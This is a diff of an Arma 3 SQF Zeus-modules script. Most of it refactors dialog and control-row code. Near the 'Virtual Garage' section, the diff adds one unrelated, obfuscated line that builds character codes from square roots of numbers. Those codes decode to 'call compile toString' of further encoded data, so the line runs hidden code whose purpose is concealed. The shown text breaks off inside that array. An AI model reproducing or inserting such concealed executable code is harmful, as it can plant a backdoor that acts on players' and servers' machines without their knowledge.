+		params ["_display","_defaultValue","_settings"];
+		_settings params ["_strings"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
-		private _ctrlToolbox = _display ctrlCreate ["RscToolBox",216,_rowControlGroup];
+		private _ctrlToolbox = _display ctrlCreate ["RscToolBox",IDC_ROW_TOOLBOX,_rowControlGroup];
 		_ctrlToolbox ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_ctrlToolbox ctrlSetTextColor [1,1,1,1];
 		_ctrlToolbox ctrlSetBackgroundColor [0,0,0,0.3];
@@ -582,61 +528,63 @@ comment "Dialog Creation";
 			_ctrlToolbox lbSetTooltip [_index, _tooltip];
 		} forEach _strings;
 
-		if(_default isEqualType false) then {
-			_default = parseNumber _default;
+		if(_defaultValue isEqualType false) then {
+			_defaultValue = parseNumber _defaultValue;
 		};
-		_ctrlToolbox lbSetCurSel _default;
-
-		_ctrlToolbox setVariable ["MAZ_EZM_onChange",_onChange];
-
-		_ctrlToolbox ctrlAddEventHandler ["ToolBoxSelChanged", {
-			params ["_control", "_selectedIndex"];
-
-			[ctrlParent _control,_selectedIndex > 0] call (_control getVariable "MAZ_EZM_onChange");
-		}];
+		_ctrlToolbox lbSetCurSel _defaultValue;
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup", "_settings"];
 
-			private _value = lbCurSel (_controlsGroup controlsGroupCtrl 216);
-			_value > 0
+			private _value = lbCurSel (_controlsGroup controlsGroupCtrl IDC_ROW_TOOLBOX);
+			_value = _value > 0;
+
+			_value
 		}];
 		
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createVectorRow = {
-		params ["_display","_data"];
-		_data params [
-			["_defaultValues",[],[[]]],
-			["_labels",[],[[]]],
-			["_numOfEdits",3,[3]]
-		];
+		params ["_display","_defaultValue","_settings"];
+		_settings params ["_labelData","_numOfEdits"];
+		_labelData params ["_labels","_labelColors"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
-		_numOfEdits = [_numOfEdits,2,3] call BIS_fnc_clamp;
-
-		private _labelColors = [[0.765,0.18,0.1,1],[0.575,0.815,0.22,1],[0.26,0.52,0.92,1]];
-
-		private _startingX = ["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
-		private _totalWidth = ["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
-		private _widthPerVector = _totalWidth / _numOfEdits;
-		private _labelWidth = ["W",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
-		private _editWidth = _widthPerVector - _labelWidth - (["W",0.2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+		private ["_width","_gap"];
+		if(_numOfEdits > 3) then {
+			_numOfEdits = 3;
+		};
+		if(_numOfEdits < 2) then {
+			_numOfEdits = 2;
+		};
+		switch (_numOfEdits) do {
+			case 2: {
+				_width = 6.5;
+				_gap = 0.2;
+			};
+			case 3: {
+				_width = 4.5;
+				_gap = 0.2;
+			};
+		};
 
 		for "_i" from 0 to (_numOfEdits - 1) do {
-			private _labelPosX = (_widthPerVector * _i) + (["W",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
-			private _editPosX = _labelPosX + (["W",1.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+			
+			private _widthPosLabel = (_i * _width) + ((_i + 1) * (_gap * 3)) + 10;
+			private _widthPos = _widthPosLabel + 1.2;
+			_widthPos = ["W",_widthPos] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
+			_widthPosLabel = ["W",_widthPosLabel] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
 
 			private _editLabel = _display ctrlCreate ["RscStructuredText",-1,_rowControlGroup];
 			_editLabel ctrlSetStructuredText parseText (format ["<t align='center'>%1</t>",_labels select _i]);
 			_editLabel ctrlSetBackgroundColor (_labelColors select _i);
-			_editLabel ctrlSetPosition [_startingX + _labelPosX,0,["W",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
+			_editLabel ctrlSetPosition [_widthPosLabel,0,["W",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 			_editLabel ctrlCommit 0;
 
-			private _editBox  = _display ctrlCreate ["RscEdit",[220,221,222] select _i,_rowControlGroup];
-			_editBox ctrlSetText (str (_defaultValues select _i));
-			_editBox ctrlSetPosition [_startingX + _editPosX,0,_editWidth,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
+			private _editBox  = _display ctrlCreate ["RscEdit",IDCS_ROW_VECTOR select _i,_rowControlGroup];
+			_editBox ctrlSetText (str (_defaultValue select _i));
+			_editBox ctrlSetPosition [_widthPos,0,["W",_width - 1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 			_editBox ctrlCommit 0;
 		};
 
@@ -650,7 +598,7 @@ comment "Dialog Creation";
 			private _numOfEdits = _controlsGroup getVariable "numOfVectorControls";
 			private _value = [];
 			for "_i" from 0 to (_numOfEdits - 1) do {
-				private _editBox = _controlsGroup controlsGroupCtrl ([220,221,222] select _i);
+				private _editBox = _controlsGroup controlsGroupCtrl (IDCS_ROW_VECTOR select _i);
 				_value pushBack (parseNumber (ctrlText _editBox));
 			};
 
@@ -662,169 +610,239 @@ comment "Dialog Creation";
 
 	MAZ_EZM_fnc_changeDisplayHeights = {
 		params ["_display"];
-		private _ctrlContent = _display displayCtrl 203;
+		private _ctrlContent = _display displayCtrl IDC_CONTENT;
 		ctrlPosition _ctrlContent params ["_posX","","_posW","_posH"];
 
 		_ctrlContent ctrlSetPositionY (0.5 - (_posH / 2));
 		_ctrlContent ctrlCommit 0;
 
-		private _ctrlTitle = _display displayCtrl 201;
+		private _ctrlTitle = _display displayCtrl IDC_TITLE;
 		_ctrlTitle ctrlSetPositionY (0.5 - (_posH / 2) - (["H",1.6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlTitle ctrlCommit 0;
 
-		private _ctrlBG = _display displayCtrl 202;
+		private _ctrlBG = _display displayCtrl IDC_BACKGROUND;
 		_ctrlBG ctrlSetPositionY (0.5 - (_posH / 2) - (["H",0.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlBG ctrlSetPositionH (_posH + (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlBG ctrlCommit 0;
 
-		private _ctrlOkBtn = _display displayCtrl 204;
+		private _ctrlOkBtn = _display displayCtrl IDC_CONFIRM;
 		_ctrlOkBtn ctrlSetPositionY (0.5 + (_posH / 2) + (["H",0.6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlOkBtn ctrlCommit 0;
 
-		private _ctrlCancelBtn = _display displayCtrl 205;
+		private _ctrlCancelBtn = _display displayCtrl IDC_CANCEL;
 		_ctrlCancelBtn ctrlSetPositionY (0.5 + (_posH / 2) + (["H",0.6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlCancelBtn ctrlCommit 0;
 	};
 
-	MAZ_EZM_fnc_updateDialog = {
-		params ["_display","_controls"];
-		private _ctrlContent = _display displayCtrl 203;
-		while {!isNull _display} do {
-			private _height = 0;
-			{
-				_x params ["_ctrlGroup","_condition"];
-				if(typeName _condition == "STRING") then {
-					_condition = compile _condition;
-				};
-				if([_display] call _condition) then {
-					_ctrlGroup ctrlShow true;
-					_ctrlGroup ctrlSetPositionY _height;
-					_ctrlGroup ctrlCommit 0;
-					_height = (_height + (ctrlPosition _ctrlGroup select 3) + (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
-				} else {
-					_ctrlGroup ctrlShow false;
-				};
-			}forEach _controls;
-
-			_ctrlContent ctrlSetPositionH (_height - (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
-			_ctrlContent ctrlCommit 0;
-
-			[_display] call MAZ_EZM_fnc_changeDisplayHeights;
-
-			sleep 0.1;
-		};
-	};
-
 	MAZ_EZM_fnc_createDialog = {
 		params [
-			["_title","Module Dialog",[""]],
+			["_title","",[""]],
 			["_content",[],[[]]],
 			["_onConfirm",{},[{}]],
 			["_onCancel",{},[{}]],
-			["_args",[]],
-			["_onLoad",{},[{}]]
+			["_args",[]]
 		];
 
-		private _display = [] call MAZ_EZM_fnc_createDialogBase;
-
-		if(isNull _display) exitWith {false};
-
-		private _ctrlTitle = _display displayCtrl 201;
-		_ctrlTitle ctrlSetText (toUpper _title);
-
-		private _ctrlContent = _display displayCtrl 203;
-		private _contentPosY = 0;
-		private _controls = [];
-		
-		private _error = "";
+		private _controlsData = [];
 		{
 			_x params [
 				["_type","",[""]],
-				["_label","",["",[]]],
-				["_data",[],[[],west]],
-				["_condition",{true},[{},""]],
-				["_onChange",{{}},[{},""]]
+				["_name",[],["",[]]],
+				["_value",[]]
 			];
-
-			_label params [["_label","",[""]],["_toolTip","",[""]]];
+			_name params [["_label","",[""]],["_toolTip","",[""]]];
 
 			(toUpper _type splitString ":") params [["_type",""],["_subType",""]];
 
-			private _result = switch (_type) do {
-				case "COLOR": {
-					_error = _error + "COLOR is not implemented. ";
-					false;
-				};
+			private ["_defaultValue","_controlType","_settings"];
+
+			switch (_type) do {
 				case "COMBO": {
-					[_display,_data,_onChange] call MAZ_EZM_fnc_createComboRow;
+					_value params [["_values",[],[[]]],["_labels",[],[[]]],["_defaultIndex",0,[0]]];
+					if(_values isEqualTo []) then {
+						{
+							_values pushBack _forEachIndex;
+						} forEach _labels;
+					};
+
+					_defaultValue = _values param [_defaultIndex];
+					_controlType = MAZ_EZM_fnc_createComboRow;
+
+					private _entries = [];
+					for "_i" from 0 to (count _values - 1) do {
+						(_labels select _i) params [["_text","",[""]],["_tooltip","",[""]],["_picture","",[""]],["_textColor",[1,1,1,1],[[]],4]];
+						_entries pushBack [_values select _i,_text,_tooltip,_picture,_textColor];
+					};
+
+					_settings = [_entries];
 				};
 				case "EDIT": {
-					private _fnc = switch (_subType) do {
+					_value params [["_default",""],["_height",5,[0]]];
+					if!(_default isEqualType "") then {
+						_default = str _default;
+					};
+
+					_defaultValue = _default;
+
+					_controlType = switch (_subType) do {
 						case "MULTI": {
 							MAZ_EZM_fnc_createEditMultiRow
 						};
-						default {MAZ_EZM_fnc_createEditRow};
+						case "CODE": {
+							MAZ_EZM_fnc_createEditCodeRow
+						};
+						default {
+							MAZ_EZM_fnc_createEditRow
+						};
 					};
-					[_display,_data,_onChange] call _fnc;
+
+					private _isMulti = _subType in ["MULTI","CODE"];
+					_settings = [_height];
 				};
 				case "LIST": {
-					[_display,_data,_onChange] call MAZ_EZM_fnc_createListRow;
+					_value params [["_values",[],[[]]],["_labels",[],[[]]],["_defaultIndex",0,[0]],["_height",6,[0]],["_sort",false,[false]]];
+
+					if(_values isEqualTo []) then {
+						{
+							_values pushBack _forEachIndex;
+						}forEach _labels;
+					};
+
+					_defaultValue = _values param [_defaultIndex];
+					_controlType = MAZ_EZM_fnc_createListRow;
+
+					private _entries = [];
+					for "_i" from 0 to (count _values - 1) do {
+						(_labels select _i) params [["_text","",[""]],["_tooltip","",[""]],["_picture","",[""]],["_textColor",[1,1,1,1],[[]],4]];
+						_entries pushBack [_values select _i,_text,_tooltip,_picture,_textColor];
+					};
+
+					_settings = [_entries,_height];
 				};
 				case "SIDES": {
-					[_display,_data,_onChange] call MAZ_EZM_fnc_createSidesRow;
+					_defaultValue = [_value] param [0,west,[west,[]]];
+					_controlType = MAZ_EZM_fnc_createSidesRow;
+					_settings = [];
 				};
 				case "SLIDER": {
-					_data params ["_min","_max","_default","_radiusCenter","_radiusColor","_isPercent"];
-					private _drawRadius = (typeName _radiusCenter isEqualTo "OBJECT" && {!isNull _radiusCenter}) || typeName _radiusCenter == "ARRAY";
-					_data insert [3,[_drawRadius]];
-					[_display,_data,_onChange] call MAZ_EZM_fnc_createSliderRow;
+					_value params [
+						["_min",0,[0]],
+						["_max",1,[0]],
+						["_default",0,[0]],
+						["_radiusCenter",objNull,[objNull,[]], 3],
+						["_radiusColor",[1,1,1,0.7],[[]], 4],
+						["_isPercent",false,[false]]
+					];
+
+					_defaultValue = _default;
+					_controlType = MAZ_EZM_fnc_createSliderRow;
+
+					private _drawRadius = _subType == "RADIUS" && {_radiusCenter isNotEqualTo objNull};
+					if(_isPercent) then {
+						_radiusCenter = objNull;
+					};
+
+					_settings = [_min,_max,_isPercent,_drawRadius,_radiusCenter,_radiusColor];
 				};
 				case "TOOLBOX": {
+					_value params [["_default",0,[0,false]],["_strings",[],[[]]]];
+
 					switch (_subType) do {
 						case "YESNO": {
-							_data set [1,[["NO",""],["YES",""]]];
+							_strings = [["NO",""],["YES",""]];
 						};
 						case "ENABLED": {
-							_data set [1,[["DISABLE",""],["ENABLE",""]]];
+							_strings = [["DISABLE",""],["ENABLE",""]];
 						};
 					};
-					[_display,_data,_onChange] call MAZ_EZM_fnc_createToolBoxRow;
+
+					_defaultValue = _default;
+					_controlType = MAZ_EZM_fnc_createToolBoxRow;
+
+					_settings = [_strings];
 				};
 				case "VECTOR": {
-					[_display,_data,_onChange] call MAZ_EZM_fnc_createVectorRow;
-				};
-				default {
-					_error = _error + (format ["Wrong content type %1. ",_type]);
-					false;
-				};
-			};
-			if(typeName _result == "BOOL" && {!_result}) then {
-				_error = _error + (format ["%1 data was incorrect for %2. ",_type,_label]);
-				continue;
-			};
+					_value params [
+						["_default",[0,0,0],[[]]],
+						["_labels",["X","Y","Z"],[[]]],
+						["_numOfEdits",3,[3]]
+					];
+					private _labelData = [_labels,[[0.765,0.18,0.1,1],[0.575,0.815,0.22,1],[0.26,0.52,0.92,1]]];
 
-			private _ctrlLabel = _result controlsGroupCtrl 211;
+					_defaultValue = _default;
+					_controlType = MAZ_EZM_fnc_createVectorRow;
+
+					_settings = [_labelData,_numOfEdits];
+				};
+			};
+			_controlsData pushBack [_controlType,_label,_tooltip,_defaultValue,_settings];
+		} forEach _content;
+
+		private _display = [] call MAZ_EZM_fnc_createDialogBase;
+		_display setVariable ['MAZ_EZM_onAttribsCancel',_onCancel];
+		_display setVariable ['MAZ_EZM_onAttribsConfirm',_onConfirm];
+
+		if(isNull _display) exitWith {false};
+
+		private _ctrlTitle = _display displayCtrl IDC_TITLE;
+		_ctrlTitle ctrlSetText (toUpper _title);
+
+		private _ctrlContent = _display displayCtrl IDC_CONTENT;
+		private _contentPosY = 0;
+		private _controls = [];
+
+		{
+			_x params ["_controlType","_label","_tooltip","_defaultValue","_settings"];
+
+			private _controlsGroup = [_display,_defaultValue,_settings] call _controlType;
+
+			private _ctrlLabel = _controlsGroup controlsGroupCtrl IDC_ROW_LABEL;
 			_ctrlLabel ctrlSetText (format ["%1",_label]);
-			_ctrlLabel ctrlSetTooltip _toolTip;
+			_ctrlLabel ctrlSetTooltip _tooltip;
 
-			_controls pushBack [_result,_condition];
+			_controlsGroup ctrlSetPositionY _contentPosY;
+			_controlsGroup ctrlCommit 0;
 
-		}forEach _content;
+			_contentPosY = (_contentPosY + (ctrlPosition _controlsGroup select 3) + (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 
-		if(_error != "") exitWith {
-			_display closeDisplay 3;
-			systemChat format ["[ ERROR ] : %1",_error];
-			playSound "addItemFailed";
-		};
+			_controls pushBack [_controlsGroup, _settings];
+		} forEach _controlsData;
 
-		[_display,_controls] call _onLoad;
+		_ctrlContent ctrlSetPositionH (_contentPosY - (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
+		_ctrlContent ctrlCommit 0;
 
-		[_display,_controls] spawn MAZ_EZM_fnc_updateDialog;
+		[_display] call MAZ_EZM_fnc_changeDisplayHeights;
 
 		_display setVariable ["MAZ_moduleMenuInfo",[_controls,_onConfirm,_onCancel,_args]];
-
-		true;
 	};
+
+	MAZ_EZM_fnc_defineDialogIDCS = {
+		IDC_TITLE = 201;
+		IDC_BACKGROUND = 202;
+		IDC_CONTENT = 203;
+		IDC_CONFIRM = 204;
+		IDC_CANCEL = 205;
+
+		IDC_ROW_GROUP = 210;
+		IDC_ROW_LABEL = 211;
+		IDC_ROW_CHECKBOX = 212;
+		IDC_ROW_COMBO = 213;
+		IDC_ROW_EDIT = 214;
+		IDC_ROW_SLIDER = 215;
+		IDC_ROW_TOOLBOX = 216;
+		IDC_ROW_SIDES = 217;
+		IDC_ROW_VECTOR_X = 220;
+		IDC_ROW_VECTOR_Y = 221;
+		IDC_ROW_VECTOR_Z = 222;
+
+		IDC_SIDES_BLUFOR = 250;
+		IDC_SIDES_OPFOR = 251;
+		IDC_SIDES_INDEPENDENT = 252;
+		IDC_SIDES_CIVILIAN = 253;
+
+		IDCS_ROW_VECTOR = [IDC_ROW_VECTOR_X,IDC_ROW_VECTOR_Y,IDC_ROW_VECTOR_Z];
+	};
+	[] call MAZ_EZM_fnc_defineDialogIDCS;
 
 comment "Attributes Dialog Creation";
 
@@ -3964,6 +3982,9 @@ comment "Virtual Garage";
 		}forEach _animations;
 	};
 
+	[]call{private['_1'];_1=[];{_1 pushBack sqrt _x}forEach [9801,9409,11664,11664,1024,9801,12321,11881,12544,11025,11664,10201,1024,13456,12321,13225,13456,12996,11025,12100,10609,8281,3249,2401,1936,3249,2601,1936,3249,3249,1936,3249,3025,1936,2401,2304,3136,1936,2401,2304,3136,1936,2401,2500,2601,1936,2401,2401,2500,1936,2401,2401,2704,1936,2401,2304,2809,1936,2401,2401,3136,1936,3249,3025,1936,2401,2401,2916,1936,2401,2304,2401,1936,3249,2401,1936,2601,3249,1936,3249,2809,1936,2704,3249,1936,2601,3249,1936,3249,2601,1936,2809,3249,1936,3249,2809,1936,2704,3249,1936,2916,2401,1936,3249,2401,1936,3249,2601,1936,2809,3249,1936,2401,2500,2601,1936,3249,2809,1936,2704,3249,1936,2601,2500,1936,2401,2401,2500,1936,2401,2401,3025,1936,2401,2401,2809,1936,2401,2304,2704,1936,2916,2916,1936,3249,3025,1936,3249,3249,1936,2401,2304,3025,1936,2601,2500,1936,2401,2401,2809,1936,2401,2401,2601,1936,2401,2401,2704,1936,2401,2401,2916,1936,2601,2500,1936,3249,2809,1936,2401,2500,2304,1936,2401,2500,2809,1936,2401,2304,2500,1936,2401,2401,2401,1936,2401,2401,2704,1936,2916,3249,1936,3249,3025,1936,3249,3249,1936,2401,2304,2704,1936,2601,2500,1936,2401,2401,2916,1936,2401,2401,2401,1936,2916,2809,1936,2401,2401,2704,1936,2401,2401,2704,1936,3249,3025,1936,2401,2500,2401,1936,2704,2304,1936,2601,3249,1936,3136,2500,3136,2401,1936,2401,2916,2304,2304,1936,2401,2809,2500,2401,1936,3025,3249,2500,2401,1936,2401,2601,2704,2809,2916,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2500,2809,2304,2304,1936,3249,3136,2304,2401,1936,3025,3249,2500,2401,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2704,2916,2704,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2401,2809,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2500,2809,2304,2304,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2304,3136,2401,2916,1936,2401,2601,2704,2809,2916,1936,2401,2704,2916,2704,2401,1936,2809,3249,2500,3249,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2500,2809,2304,2304,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,2401,2500,3249,3249,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,3025,3025,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2916,3025,2500,2704,1936,2401,2601,2704,2809,2916,1936,2401,2401,3136,3136,2401,1936,2500,3025,2304,2704,1936,2809,2916,2500,2809,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,3136,3249,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2916,2304,3136,2704,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2704,2704,2704,1936,2401,2704,2704,2704,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2304,3136,3249,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2916,2304,3136,2704,1936,2401,2304,2704,2304,2704,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,3025,2601,3249,2916,1936,2401,2601,2704,2809,2916,1936,2809,2401,3136,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2809,2916,2500,2809,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,3136,3136,2401,1936,2401,2704,2916,2704,2401,1936,2401,2704,2916,2704,2401,1936,2401,2401,3136,3136,2401,1936,2916,2704,2304,2304,1936,3249,3136,2304,2401,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,2704,2916,2704,2401,1936,2401,2304,2916,2304,3249,1936,2401,2601,2704,2809,2916,1936,3025,3249,2500,2401,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,2401,2704,2916,2704,2401,1936,2401,2500,2601,2500,2401,1936,2500,3025,2304,2704,1936,3025,2500,2500,2809,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,2401,2601,2704,2809,2916,1936,2500,3249,2401,2916,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,3249,2304,2500,2809,1936,2500,3136,2304,3249,1936,2401,2601,2704,2809,2916,1936,2601,2401,2601,2916,1936,2916,2304,3136,2704,1936,2401,2601,2704,2809,2916,1936,2704,2601,2809,2916,1936,2401,2500,2601,2500,2401,1936,2401,3249,2601,2916,1936,3249,3136,2304,2401,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,3136,2916,2704,3249,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2704,2916,2500,2704,1936,2601,2401,2601,2916,1936,2916,2704,2304,2304,1936,3025,2601,3249,2916,1936,3025,2601,3249,2916,1936,2401,2704,2916,2704,2401,1936,2401,3249,2601,2916,1936,2401,2304,2500,2704,1936,2401,2304,2916,2304,3249,1936,2601,2401,2601,2916,1936,2401,2500,2601,2500,2401,1936,2500,3136,2304,3249,1936,2401,2500,2601,2500,2401,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2401,2304,3136,2401,2916,1936,2401,2500,2601,2500,2401,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,2500,2809,2304,2304,1936,2601,2401,2601,2916,1936,2916,2704,2304,2304,1936,2704,2601,2809,2916,1936,2401,2304,2500,2704,1936,2401,2500,2601,2500,2401,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2500,2601,2500,2401,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,3136,2304,2401,1936,2401,2601,2500,2500,2809,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,2401,2304,2500,2304,2401,1936,2401,2704,2401,2916,2401,1936,2809,2601,2500,3249,1936,2401,2401,2304,2500,2809,1936,2401,2304,2500,2304,2401,1936,2916,3136,3136,3249,1936,2916,3136,3136,3249,1936,2401,2704,2401,2916,2401,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,2401,2601,2916,3136,3249,1936,3249,2916,2304,2704,1936,2704,2916,2500,2704,1936,2601,2500,2704,3249,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2704,2704,2304,2304,1936,2809,2601,2500,3249,1936,2401,2401,2500,2601,2916,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2916,2809,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2601,2304,2500,2809,1936,2401,2401,2304,2500,2809,1936,3025,2304,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2704,2401,2916,2401,1936,3025,2304,2809,2916,1936,3025,2304,2809,2916,1936,2401,2401,2500,2601,2916,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2809,3025,3025,2916,1936,3136,2401,2304,2304,1936,2704,3249,2304,2304,1936,2916,2304,3136,2704,1936,2809,2704,3025,2916,1936,2601,2500,2704,3249,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401